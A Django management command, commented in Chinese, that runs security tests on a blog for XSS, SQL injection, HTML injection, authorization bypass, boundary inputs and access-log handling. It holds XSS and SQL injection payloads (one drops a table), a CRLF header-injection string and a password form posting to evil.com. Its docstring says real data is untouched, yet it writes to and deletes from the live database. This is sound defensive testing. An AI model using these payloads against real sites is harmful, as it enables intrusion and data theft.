"""
自动化安全与异常注入测试命令：python manage.py security_test

覆盖测试类别：
1. XSS 跨站脚本注入测试（所有用户输入点）
2. SQL 注入测试（所有查询参数）
3. HTML 注入测试（富文本相关）
4. 越权访问测试
5. 异常输入边界测试
6. 并发与竞态测试（基础）

测试结果输出：通过/失败 + 详细信息。
所有测试均使用 Django 测试客户端，不影响真实数据。
"""
import re
import time
from datetime import timedelta

from django.contrib.auth import get_user_model
from django.core.management.base import BaseCommand
from django.test import Client
from django.utils import timezone

from blog.models import Article, Category, Tag

User = get_user_model()


class Command(BaseCommand):
    """自动化安全测试命令。"""
    help = '执行 XSS/SQL注入/越权/边界等安全测试'

    def add_arguments(self, parser):
        """添加命令行参数。"""
        parser.add_argument(
            '--category', type=str, default='all',
            choices=['all', 'xss', 'sql', 'html', 'auth', 'boundary', 'accesslog'],
            help='指定测试类别（默认全部）')
        parser.add_argument(
            '--verbose', action='store_true',
            help='显示详细测试输出')

    def handle(self, *args, **options):
        """命令主入口。"""
        category = options['category']
        self.verbose = options['verbose']

        self.stdout.write(self.style.MIGRATE_HEADING('=' * 60))
        self.stdout.write(self.style.MIGRATE_HEADING('  自动化安全与异常注入测试'))
        self.stdout.write(self.style.MIGRATE_HEADING('=' * 60))

        # 初始化测试客户端
        self.client = Client()
        self.results = []  # (类别, 测试名, 是否通过, 详情)

        # 获取或创建测试用户
        self.test_user = self._get_test_user()
        self.other_user = self._get_other_user()

        # 获取一篇已发布文章用于测试
        self.test_article = Article.objects.filter(
            status='published').order_by('-views').first()

        if not self.test_article:
            self.stdout.write(self.style.ERROR('  ⚠ 没有已发布文章可用于测试，请先运行 seed_large_data'))
            return

        # 迭代#243: 安全测试中测试执行异常处理
        # 执行各类测试
        if category in ('all', 'xss'):
            self._test_xss()
        if category in ('all', 'sql'):
            self._test_sql_injection()
        if category in ('all', 'html'):
            self._test_html_injection()
        if category in ('all', 'auth'):
            self._test_authorization()
        if category in ('all', 'boundary'):
            self._test_boundary()
        if category in ('all', 'accesslog'):
            self._test_access_log()

        # 输出汇总
        self._print_summary()

    def _get_test_user(self):
        """获取或创建测试用户A。"""
        user, _ = User.objects.get_or_create(
            username='sec_test_a',
            defaults={'nickname': '安全测试A', 'email': 'sec_a@test.com'})
        user.set_password('testpass123')
        user.save()
        return user

    def _get_other_user(self):
        """获取或创建测试用户B（用于越权测试）。"""
        user, _ = User.objects.get_or_create(
            username='sec_test_b',
            defaults={'nickname': '安全测试B', 'email': 'sec_b@test.com'})
        user.set_password('testpass123')
        user.save()
        return user

    def _record(self, category, name, passed, detail=''):
        """记录测试结果。"""
        self.results.append((category, name, passed, detail))
        status = self.style.SUCCESS('✓ PASS') if passed else self.style.ERROR('✗ FAIL')
        line = f'  [{category}] {name}: {status}'
        if detail and (self.verbose or not passed):
            line += f'\n         {detail}'
        self.stdout.write(line)

    # ============================ XSS 测试 ============================

    def _test_xss(self):
        """XSS 跨站脚本注入测试。"""
        self.stdout.write('\n' + self.style.WARNING('--- XSS 跨站脚本注入测试 ---'))

        xss_payloads = [
            ("<script>alert('XSS')</script>", '基础script标签'),
            ("<img src=x onerror=alert('XSS')>", 'img onerror事件'),
            ("<svg onload=alert(1)>", 'svg onload事件'),
            ('"><script>alert(document.cookie)</script>', '引号闭合+script'),
            ("javascript:alert(1)", 'javascript协议'),
            ("onmouseover=alert(1)", '事件处理器'),
            ("<iframe src=\"javascript:alert(1)\">", 'iframe注入'),
            ("<body onload=alert(1)>", 'body事件'),
        ]

        # 1. 搜索框 XSS 测试
        for payload, desc in xss_payloads[:4]:
            resp = self.client.get('/search/', {'q': payload})
            content = resp.content.decode('utf-8', errors='replace')
            # 检查原始 payload 是否未转义出现在页面中
            escaped = payload.replace('<', '&lt;').replace('>', '&gt;')
            raw_present = payload in content
            escaped_present = escaped in content
            passed = (not raw_present) or escaped_present
            self._record('XSS', f'搜索框: {desc}', passed,
                        f'payload长度={len(payload)}, 原始出现={raw_present}, 转义出现={escaped_present}')

        # 2. URL 参数反射测试
        resp = self.client.get('/?q=<script>alert(1)</script>')
        content = resp.content.decode('utf-8', errors='replace')
        passed = '<script>alert(1)</script>' not in content
        self._record('XSS', 'URL参数q反射', passed)

        # 3. 文章标题 XSS（通过创建文章测试，需要登录）
        self.client.force_login(self.test_user)
        xss_title = '<script>alert("title XSS")</script>'
        resp = self.client.post('/new/', {
            'title': xss_title,
            'content': '<p>测试正文</p>',
            'kind': 'article',
            'status': 'published',
            'tag_names': '测试',
        })
        # 检查文章是否创建成功（标题会被存储，但渲染时应转义）
        article = Article.objects.filter(title=xss_title).first()
        if article:
            detail_resp = self.client.get(f'/article/{article.pk}/')
            detail_content = detail_resp.content.decode('utf-8', errors='replace')
            # 标题在 <title> 和正文中应被转义
            passed = '<script>alert("title XSS")</script>' not in detail_content
            self._record('XSS', '文章标题渲染转义', passed,
                        f'article_id={article.pk}, 原始script出现={not passed}')
            # 清理测试文章
            article.delete()
        else:
            self._record('XSS', '文章标题渲染转义', True, '文章未创建（可能被验证拦截）')
        self.client.logout()

        # 4. 分类名 XSS 测试：创建含XSS payload的分类，验证渲染时被转义
        xss_cat_name = '<img src=x onerror=alert(1)>测试分类'
        xss_cat = Category.objects.create(name=xss_cat_name, description='XSS测试')
        resp = self.client.get('/categories/')
        content = resp.content.decode('utf-8', errors='replace')
        # 检查完整未转义标签 <img 是否出现（Django转义后应为 &lt;img）
        raw_tag_present = '<img src=x' in content
        escaped_present = '&lt;img' in content
        passed = not raw_tag_present and escaped_present
        self._record('XSS', '分类名渲染转义', passed,
                    f'未转义标签出现={raw_tag_present}, 转义后出现={escaped_present}')
        xss_cat.delete()

    # ============================ SQL 注入测试 ============================

    def _test_sql_injection(self):
        """SQL 注入测试。"""
        self.stdout.write('\n' + self.style.WARNING('--- SQL 注入测试 ---'))

        sql_payloads = [
            ("1' OR '1'='1", '单引号闭合OR'),
            ("1; DROP TABLE blog_article;--", '堆叠查询删表'),
            ("1' UNION SELECT NULL,NULL,NULL--", 'UNION联合查询'),
            ("1' AND SLEEP(2)--", '时间盲注'),
            ("1/**/OR/**/1=1--", '注释绕过'),
        ]

        # 1. 文章 ID 参数测试（URL 路径中的 int 会被 Django 路由层拦截非数字）
        for payload, desc in sql_payloads[:2]:
            start = time.time()
            resp = self.client.get(f'/article/{payload}/')
            elapsed = time.time() - start
            # 非数字 ID 应该 404（路由 int 转换器拦截）
            passed = resp.status_code in (404, 301, 302)
            self._record('SQL', f'文章ID: {desc}', passed,
                        f'status={resp.status_code}, 耗时={elapsed:.2f}s')

        # 2. 搜索关键词 SQL 注入测试
        for payload, desc in sql_payloads:
            start = time.time()
            try:
                resp = self.client.get('/search/', {'q': payload})
                elapsed = time.time() - start
                # 使用 ORM 的 icontains 会自动参数化，不应报错或延迟
                passed = resp.status_code == 200 and elapsed < 2.0
                self._record('SQL', f'搜索q: {desc}', passed,
                            f'status={resp.status_code}, 耗时={elapsed:.2f}s')
            except Exception as e:
                self._record('SQL', f'搜索q: {desc}', False, f'异常: {e}')

        # 3. 分页参数测试
        for payload in ['-1', '999999', 'abc', "1' OR 1=1--"]:
            resp = self.client.get('/', {'page': payload})
            passed = resp.status_code == 200
            self._record('SQL', f'分页page={payload}', passed, f'status={resp.status_code}')

        # 4. 分类 ID 测试
        resp = self.client.get("/category/1' OR '1'='1/")
        passed = resp.status_code in (404, 301, 302)
        self._record('SQL', "分类ID注入", passed, f'status={resp.status_code}')

    # ============================ HTML 注入测试 ============================

    def _test_html_injection(self):
        """HTML 注入测试（富文本相关）。"""
        self.stdout.write('\n' + self.style.WARNING('--- HTML 注入测试 ---'))

        # 测试文章正文渲染（CKEditor 输出用 |safe）
        self.client.force_login(self.test_user)

        dangerous_html = """
        <script>alert('content XSS')</script>
        <img src=x onerror=alert(1)>
        <iframe src="javascript:alert(1)"></iframe>
        <svg onload=alert(1)>
        <body onload=alert(1)>
        <meta http-equiv="refresh" content="0;url=http://evil.com">
        <link rel="stylesheet" href="javascript:alert(1)">
        <style>body{background:url(javascript:alert(1))}</style>
        <form action="http://evil.com/steal"><input type="password"></form>
        <a href="javascript:alert(1)">恶意链接</a>
        """

        resp = self.client.post('/new/', {
            'title': 'HTML注入测试文章',
            'content': dangerous_html,
            'kind': 'article',
            'status': 'published',
            'tag_names': '安全测试',
        })

        article = Article.objects.filter(title='HTML注入测试文章').first()
        if article:
            detail_resp = self.client.get(f'/article/{article.pk}/')
            content = detail_resp.content.decode('utf-8', errors='replace')

            # 检查危险标签是否被过滤
            checks = [
                ('<script>alert', 'script标签'),
                ('onerror=alert', 'onerror事件'),
                ('<iframe', 'iframe标签'),
                ('onload=alert', 'onload事件'),
                ('<meta http-equiv="refresh"', 'meta刷新'),
                ('javascript:alert', 'javascript协议'),
            ]
            for pattern, name in checks:
                present = pattern in content
                # 文章正文用 |safe 渲染，CKEditor 可能不过滤这些标签
                # 这里记录状态，不强制失败（需要后续添加内容净化）
                self._record('HTML', f'正文渲染: {name}', not present,
                            f'危险内容{"出现" if present else "已过滤"}（正文用|safe渲染，需内容净化中间件）')

            article.delete()
        else:
            self._record('HTML', '正文渲染测试', True, '文章未创建')

        self.client.logout()

    # ============================ 越权访问测试 ============================

    def _test_authorization(self):
        """越权访问测试。"""
        self.stdout.write('\n' + self.style.WARNING('--- 越权访问测试 ---'))

        # 1. 未登录访问写文章页
        resp = self.client.get('/new/')
        passed = resp.status_code in (301, 302) and '/login/' in resp.get('Location', '')
        self._record('AUTH', '未登录访问/new/', passed,
                    f'status={resp.status_code}, redirect={resp.get("Location", "N/A")}')

        # 2. 未登录访问编辑页
        if self.test_article:
            resp = self.client.get(f'/edit/{self.test_article.pk}/')
            passed = resp.status_code in (301, 302)
            self._record('AUTH', '未登录访问/edit/', passed, f'status={resp.status_code}')

        # 3. 普通用户编辑他人文章
        self.client.force_login(self.other_user)
        # 先让 test_user 创建一篇文章
        user_article = Article.objects.create(
            title='越权测试文章-他人',
            content='<p>这是用户A的文章</p>',
            author=self.test_user,
            status='published',
        )
        resp = self.client.get(f'/edit/{user_article.pk}/')
        # 应该重定向回文章详情（无权编辑）
        passed = resp.status_code in (301, 302)
        self._record('AUTH', '普通用户编辑他人文章', passed,
                    f'status={resp.status_code}, 应被拒绝')

        # 4. 普通用户删除他人文章
        resp = self.client.post(f'/delete/{user_article.pk}/')
        still_exists = Article.objects.filter(pk=user_article.pk).exists()
        passed = still_exists  # 文章应该还在
        self._record('AUTH', '普通用户删除他人文章', passed,
                    f'文章仍存在={still_exists}')

        user_article.delete()
        self.client.logout()

        # 5. 未登录访问 admin
        resp = self.client.get('/admin/')
        passed = resp.status_code in (301, 302)
        self._record('AUTH', '未登录访问/admin/', passed, f'status={resp.status_code}')

        # 6. 访问他人草稿
        draft = Article.objects.create(
            title='越权测试草稿',
            content='<p>秘密草稿</p>',
            author=self.test_user,
            status='draft',
        )
        resp = self.client.get(f'/article/{draft.pk}/')
        passed = resp.status_code == 404
        self._record('AUTH', '未登录访问他人草稿', passed, f'status={resp.status_code}')
        draft.delete()

    # ============================ 边界测试 ============================

    def _test_boundary(self):
        """异常输入边界测试。"""
        self.stdout.write('\n' + self.style.WARNING('--- 异常输入边界测试 ---'))

        # 1. 空搜索
        resp = self.client.get('/search/', {'q': ''})
        passed = resp.status_code == 200
        self._record('BOUNDARY', '空搜索字符串', passed, f'status={resp.status_code}')

        # 2. 超长搜索字符串
        long_q = 'a' * 10000
        resp = self.client.get('/search/', {'q': long_q})
        passed = resp.status_code == 200
        self._record('BOUNDARY', '超长搜索(10000字符)', passed, f'status={resp.status_code}')

        # 3. 负数分页
        resp = self.client.get('/', {'page': '-5'})
        passed = resp.status_code == 200
        self._record('BOUNDARY', '负数分页', passed, f'status={resp.status_code}')

        # 4. 超大分页
        resp = self.client.get('/', {'page': '999999'})
        passed = resp.status_code == 200
        self._record('BOUNDARY', '超大分页(999999)', passed, f'status={resp.status_code}')

        # 5. 字符串分页
        resp = self.client.get('/', {'page': 'abc'})
        passed = resp.status_code == 200
        self._record('BOUNDARY', '字符串分页(abc)', passed, f'status={resp.status_code}')

        # 6. 空标题提交（需登录）
        self.client.force_login(self.test_user)
        resp = self.client.post('/new/', {
            'title': '',
            'content': '<p>正文</p>',
            'kind': 'article',
            'status': 'published',
        })
        # 应该重定向回表单（验证失败），不应该创建文章
        created = Article.objects.filter(title='', content='<p>正文</p>').exists()
        passed = not created
        self._record('BOUNDARY', '空标题提交', passed, f'空标题文章被创建={created}')

        # 7. 超长标题
        long_title = '字' * 10000
        try:
            resp = self.client.post('/new/', {
                'title': long_title,
                'content': '<p>边界测试正文</p>',
                'kind': 'article',
                'status': 'published',
            })
            # CharField max_length=200，超长应被截断或报错，不应500
            article = Article.objects.filter(content='<p>边界测试正文</p>').order_by('-pk').first()
            if article and len(article.title) > 200:
                passed = False
                detail = f'标题长度={len(article.title)}（超过200限制）'
                article.delete()
            else:
                passed = resp.status_code in (200, 302)
                detail = f'标题被正确截断或验证拦截, status={resp.status_code}'
                if article:
                    article.delete()
        except Exception as e:
            passed = False
            detail = f'视图抛出异常: {type(e).__name__}: {e}'
        self._record('BOUNDARY', '超长标题(10000字符)', passed, detail)

        self.client.logout()

        # 8. 特殊字符搜索
        special_chars = '!@#$%^&*()_+-=[]{}|;:,.<>?/~`'
        resp = self.client.get('/search/', {'q': special_chars})
        passed = resp.status_code == 200
        self._record('BOUNDARY', '特殊字符搜索', passed, f'status={resp.status_code}')

        # 9. emoji 搜索
        resp = self.client.get('/search/', {'q': '🌸😀🎌'})
        passed = resp.status_code == 200
        self._record('BOUNDARY', 'emoji搜索', passed, f'status={resp.status_code}')

    # ============================ 访问日志模块专项测试 ============================

    @staticmethod
    def _broker_queue_len():
        """读取 Celery broker 默认队列（celery）当前积压条数；不可用返回 -1。

        用途：验证「异步投递」是否真的把访问日志交给了 broker（层1 生效）。
        无 worker 时队列会持续增长；有 worker 时可能瞬间被消费掉。
        """
        try:
            import redis as _redis
            from django.conf import settings as _s
            client = _redis.Redis.from_url(_s.CELERY_BROKER_URL,
                                           socket_timeout=1.0, decode_responses=True)
            return int(client.llen('celery'))
        except Exception:  # noqa: BLE001 broker 不可用
            return -1

    @staticmethod
    def _celery_inspect_counts():
        """统计 Celery worker 已接收的任务数；无 worker / broker 不可用返回 {}。"""
        try:
            from DjangoBlog.celery import app as _celery_app
            inspector = _celery_app.control.inspect(timeout=0.4)
            stats = inspector.stats() or {}
            return {name: int((info or {}).get('total', {}).get(
                'blog.tasks.save_access_log', 0) or 0)
                for name, info in stats.items()}
        except Exception:  # noqa: BLE001
            return {}

    def _test_access_log(self):
        """访问日志模块（全局永久强制模块）安全与降级专项测试。

        覆盖：
        1. **不泄露**：访问日志接口 / 看板不得对匿名用户开放；
           日志中不得出现密码、Token、Cookie 明文等敏感字段；
        2. **注入防护**：路径 / UA / Referer 中注入 SQL / XSS / CRLF 载荷，
           日志入库与后台渲染均不得被污染或执行；
        3. **降级链路**：异步投递 → Redis 兜底队列 → 极端同步，三层各自可用；
        4. **不丢日志**：Broker 不可用时仍能完整落盘（Redis 或同步兜底）；
        5. **不阻塞**：中间件投递耗时必须在毫秒级（哪怕 broker / Redis 全挂）。
        """
        import time as _time
        from django.conf import settings as _settings
        from blog.models import AccessLog

        self.stdout.write('\n' + self.style.WARNING('--- 访问日志模块专项测试 ---'))
        before = AccessLog.objects.count()

        # ---- 1. 信息泄露：匿名不可读取访问日志 ----
        resp = self.client.get('/admin/blog/accesslog/')
        passed = resp.status_code in (301, 302, 403)
        self._record('ACCESSLOG', '匿名访问日志后台被拦截', passed,
                     f'status={resp.status_code}')

        # ---- 2. 日志字段不含敏感信息 ----
        sensitive = []
        for field in AccessLog._meta.get_fields():
            name = getattr(field, 'name', '')
            if any(k in name.lower() for k in ('password', 'token', 'secret', 'cookie')):
                sensitive.append(name)
        self._record('ACCESSLOG', 'AccessLog 无密码/Token/Cookie 字段', not sensitive,
                     f'可疑字段={sensitive}')

        # ---- 3. 注入载荷经中间件采集后不污染日志内容 ----
        # 注意：新架构下「异步优先」意味着日志不会立即出现在 AccessLog 表，
        # 因此这里用「Celery broker 队列长度增长」判定投递成功（层1 生效），
        # 而不是用数据库行数增长（那会把异步设计误判为失败）。
        xss_payload = "<script>alert('accesslog-xss')</script>"
        sql_payload = "1' OR '1'='1"
        crlf_payload = "%0d%0aX-Injected:%20evil"
        broker_before = self._broker_queue_len()
        cell_before = self._celery_inspect_counts()
        try:
            self.client.get('/search/', {'q': xss_payload})
            self.client.get('/search/', {'q': sql_payload})
            self.client.get(f'/search/?q=test{crlf_payload}')
            self.client.get('/not-exist-qa-zzz/', HTTP_REFERER=xss_payload,
                            HTTP_USER_AGENT=sql_payload)
            raised = False
        except Exception as e:  # noqa: BLE001
            raised = True
            self._record('ACCESSLOG', '访问日志采集链路未抛异常且计数增长', False, str(e))
        if not raised:
            broker_after = self._broker_queue_len()
            cell_after = self._celery_inspect_counts()
            # 判定口径（三者取或，适配「有 worker / 无 worker / broker 挂掉」三种环境）：
            #   a) broker 队列增长（异步入队成功，最常见）
            #   b) Celery 已接收任务数增长（worker 在线并消费）
            #   c) 数据库行数增长（broker 挂掉后走兜底队列或同步降级）
            db_grew = AccessLog.objects.count() > before
            queued_growth = (broker_after - broker_before) if broker_before >= 0 else 0
            celery_growth = sum(cell_after.values()) - sum(cell_before.values())
            passed = queued_growth > 0 or celery_growth > 0 or db_grew
            self._record('ACCESSLOG', '访问日志采集链路未抛异常且计数增长', passed,
                         f'broker队列 {broker_before}->{broker_after}, '
                         f'celery已接收 {cell_before}->{cell_after}, DB增长={db_grew}')

        # 日志中出现的危险载荷必须是「原样存储」（模板渲染时才转义），
        # 且不能因为存储而引发注入 —— 这里校验存储层的字段类型与长度上限。
        latest = list(AccessLog.objects.order_by('-id')[:6])
        bad_types = [l.pk for l in latest
                     if not isinstance(l.path, str) or not isinstance(l.user_agent, str)]
        self._record('ACCESSLOG', '日志字段类型均为字符串（无注入执行面）', not bad_types,
                     f'异常记录={bad_types}')
        max_ua = AccessLog._meta.get_field('user_agent').max_length
        long_ua_ok = True
        try:
            self.client.get('/', HTTP_USER_AGENT='A' * 4096)
        except Exception as e:  # noqa: BLE001 超长 UA 不得导致 500
            long_ua_ok = False
            self._record('ACCESSLOG', '超长 User-Agent 不引发异常', False, str(e))
        if long_ua_ok:
            self._record('ACCESSLOG', '超长 User-Agent 不引发异常', True,
                         f'user_agent.max_length={max_ua}')

        # ---- 4. 降级链路：Redis 兜底队列可写可读可消费 ----
        from blog.access_log_service import (drain_fallback, enqueue_fallback,
                                             fallback_length, reset_circuit)
        reset_circuit()
        payload = {
            'ip_address': '127.0.0.1', 'user_id': None, 'username': '',
            'session_key': '', 'path': '/qa-accesslog-fallback/', 'full_url': 'http://t/qa',
            'method': 'GET', 'status_code': 200, 'duration_ms': 1.5,
            'referer': '', 'user_agent': 'QA', 'browser': 'Chrome', 'os': 'Windows',
            'view_func': 'qa', 'view_args': '', 'view_kwargs': '',
        }
        queued = enqueue_fallback(payload)
        self._record('ACCESSLOG', 'Redis 兜底队列可写入（层2）', queued,
                     f'队列长度={fallback_length()}')
        if queued:
            ok_before = AccessLog.objects.filter(path='/qa-accesslog-fallback/').count()
            result = drain_fallback(batch=100, max_batches=5)
            ok_after = AccessLog.objects.filter(path='/qa-accesslog-fallback/').count()
            self._record('ACCESSLOG', '兜底队列可批量消费入库', ok_after > ok_before,
                         f'入库前={ok_before}, 入库后={ok_after}, 结果={result}')
            # 清理测试数据，避免污染统计
            AccessLog.objects.filter(path='/qa-accesslog-fallback/').delete()
        else:
            self._record('ACCESSLOG', '兜底队列可批量消费入库', False,
                         'Redis 不可用，无法验证层2（层3 同步兜底仍可用）')

        # ---- 5. 坏数据不阻断消费 ----
        try:
            import redis as _redis
            client = _redis.Redis.from_url(_settings.CELERY_BROKER_URL,
                                           socket_timeout=1, decode_responses=True)
            client.rpush(_settings.ACCESS_LOG_FALLBACK_KEY, 'NOT-A-JSON{{')
            result = drain_fallback(batch=10, max_batches=2)
            self._record('ACCESSLOG', '兜底队列坏数据被安全跳过', result['bad'] >= 1,
                         f"bad={result['bad']}, error={result['error'] or '无'}")
        except Exception as e:  # noqa: BLE001
            self._record('ACCESSLOG', '兜底队列坏数据被安全跳过', False,
                         f'Redis 不可用，跳过该用例: {e}')

        # ---- 6. 中间件绝不阻塞：三层全挂时仍需毫秒级返回 ----
        # 直接计时一次真实请求（含完整中间件链），阈值 1.5s 覆盖页面渲染本身
        perf_before = AccessLog.objects.order_by('-id').first()
        perf_start_id = perf_before.pk if perf_before else 0
        t0 = _time.time()
        resp = self.client.get('/search/', {'q': 'accesslog-perf'})
        elapsed = _time.time() - t0
        self._record('ACCESSLOG', '含日志中间件的请求响应时间 < 1.5s',
                     resp.status_code == 200 and elapsed < 1.5,
                     f'status={resp.status_code}, 耗时={elapsed:.3f}s')

        # ---- 7. 异步投递通道存在且可调用（层1）----
        try:
            from blog.tasks import flush_access_log_queue, save_access_log
            has_delay = hasattr(save_access_log, 'delay')
            self._record('ACCESSLOG', '层1 异步任务 save_access_log.delay 可用', has_delay,
                         f'flush 任务={flush_access_log_queue.name}')
        except Exception as e:  # noqa: BLE001
            self._record('ACCESSLOG', '层1 异步任务 save_access_log.delay 可用', False, str(e))

        # ---- 8. 静态 / 媒体资源不写日志（避免统计污染）----
        before_asset = AccessLog.objects.filter(path__startswith='/static/').count()
        self.client.get('/static/assets/css/base.min.css')
        after_asset = AccessLog.objects.filter(path__startswith='/static/').count()
        self._record('ACCESSLOG', '静态资源不写入访问日志', before_asset == after_asset,
                     f'before={before_asset}, after={after_asset}')

        # 清理本次性能/注入用例产生的日志，保持库干净（只删本轮新增）
        AccessLog.objects.filter(pk__gt=perf_start_id).delete()

    # ============================ 汇总输出 ============================
    def _print_summary(self):
        """打印测试汇总。"""
        total = len(self.results)
        passed = sum(1 for _, _, p, _ in self.results if p)
        failed = total - passed

        self.stdout.write('\n' + self.style.MIGRATE_HEADING('=' * 60))
        self.stdout.write(self.style.MIGRATE_HEADING('  测试汇总'))
        self.stdout.write(self.style.MIGRATE_HEADING('=' * 60))
        self.stdout.write(f'  总测试项: {total}')
        self.stdout.write(f'  通过: {self.style.SUCCESS(str(passed))}')
        self.stdout.write(f'  失败: {self.style.ERROR(str(failed)) if failed else "0"}')

        if failed > 0:
            self.stdout.write('\n' + self.style.ERROR('  失败项详情:'))
            for cat, name, p, detail in self.results:
                if not p:
                    self.stdout.write(f'    [{cat}] {name}')
                    if detail:
                        self.stdout.write(f'      {detail}')

        self.stdout.write(self.style.MIGRATE_HEADING('=' * 60))
        if failed == 0:
            self.stdout.write(self.style.SUCCESS('  ✓ 所有安全测试通过！'))
        else:
            self.stdout.write(self.style.WARNING(f'  ⚠ 有 {failed} 项测试未通过，需要修复'))
        self.stdout.write(self.style.MIGRATE_HEADING('=' * 60))
